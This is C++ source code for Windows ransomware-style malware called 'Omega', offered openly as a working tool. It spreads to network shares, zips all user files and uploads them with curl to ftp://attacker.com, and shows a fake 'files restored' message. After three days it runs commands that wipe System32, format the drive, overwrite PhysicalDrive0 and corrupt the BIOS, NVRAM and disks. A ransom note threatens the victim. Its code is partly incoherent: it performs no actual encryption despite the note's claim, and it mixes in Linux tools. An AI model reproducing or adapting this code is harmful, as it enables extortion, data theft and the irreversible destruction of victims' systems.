#include <iostream>
#include <fstream>
#include <windows.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <ctime>
#include <cstdlib>
#include <thread>

#pragma comment(lib, "ntdll.lib")

using namespace std;

const int KEY_SIZE = 32;
const int BLOCK_SIZE = AES_BLOCK_SIZE;
const string LOCK_FILE = "C:\\Windows\\System32\\Omega.lock";
const char* REDBOX_TEXT = "Your files have been encrypted with AES-256 Encryption, failure to pay the ransome will result in bricked BIOS and permanent loss of your data, Do not contact any law enforcement if you do it will result to loss of everything.";

const unsigned char MASTER_KEY[KEY_SIZE] = {
    0xF3, 0xA7, 0xC9, 0xD2, 0xE8, 0xB4, 0xF1, 0xD6,  
    0xA0, 0xC3, 0xE5, 0xB7, 0xD9, 0xF2, 0x81, 0x4C,  
    0x6E, 0x2A, 0x5D, 0x3B, 0x1F, 0x7C, 0x8E, 0x0A,  
    0x4D, 0x2B, 0x6F, 0x9E, 0x3C, 0x7A, 0x1D, 0x5F  
};

// Writes infection timestamp
void drop_time_bomb() {
    time_t now = time(0);
    ofstream lock(LOCK_FILE, ios::binary);
    lock.write(reinterpret_cast<char*>(&now), sizeof(now));
    lock.close();
}

// Reads infection timestamp
bool time_expired() {
    ifstream lock(LOCK_FILE, ios::binary);
    if (!lock) return false;

    time_t start_time, now = time(0);
    lock.read(reinterpret_cast<char*>(&start_time), sizeof(start_time));
    lock.close();

    return (difftime(now, start_time) >= 259200); // 3 days
}

// Fake decryption function
void fake_decrypt() {
    cout << "[*] Decryption in progress...\n";
    Sleep(5000);  // Fake processing time

    cout << "[*] Files successfully restored!\n";
    cout << "[*] System security restored. You are safe now.\n";
    Sleep(2000);

    system("cls");
    cout << "[*] Have a nice day.\n";
    Sleep(2000);

    // But the system is still infected, and the timer keeps running
}

// Spreads to network machines
void spread() {
    system("net view > networks.txt");
    ifstream file("networks.txt");
    string line;
    while (getline(file, line)) {
        if (line.find("\\\\") != string::npos) {
            string target = line.substr(2);
            string payload = "copy Omega.exe \\\\" + target + "\\C$\\Windows\\System32\\Omega.exe";
            system(payload.c_str());
        }
    }
}

// Steals files & sends to remote server
void steal_files() {
    system("powershell Compress-Archive -Path C:\\Users\\* -DestinationPath C:\\Users\\Public\\stolen.zip");
    system("curl -T C:\\Users\\Public\\stolen.zip ftp://attacker.com --user user:password");
}

// Total destruction function (triggers after 3 days)
void total_destruction() {
    system("bcdedit /delete {default} >nul 2>&1");
    system("del C:\\Windows\\System32\\*.* /F /Q >nul 2>&1");
    system("format C: /FS:RAW /Q /X >nul 2>&1");
    system("echo 0000000000000000 > \\\\.\\PhysicalDrive0");

    system("AFUWINx64.exe /GAN > nul 2>&1"); // BIOS Corruption
    system("nvramtool -p >nul 2>&1"); // Wipes NVRAM entries
    system("hdparm --user-master u --security-erase NULL /dev/sda >nul 2>&1");

    system("shutdown /r /f /t 0"); // Restart into nothing
}

int main(int argc, char* argv[]) {
    if (argc > 1 && string(argv[1]) == "--decrypt") {
        fake_decrypt();  // Triggers the fake decryption process
        return 0;
    }

    if (!ifstream(LOCK_FILE)) {
        drop_time_bomb(); // Start countdown
    }

    // Parallel execution
    thread t1(spread);
    thread t2(steal_files);
    t1.detach();
    t2.detach();

    while (true) {
        Sleep(10000);
        if (time_expired()) {
            total_destruction();
        }
    }

    return 0;
}
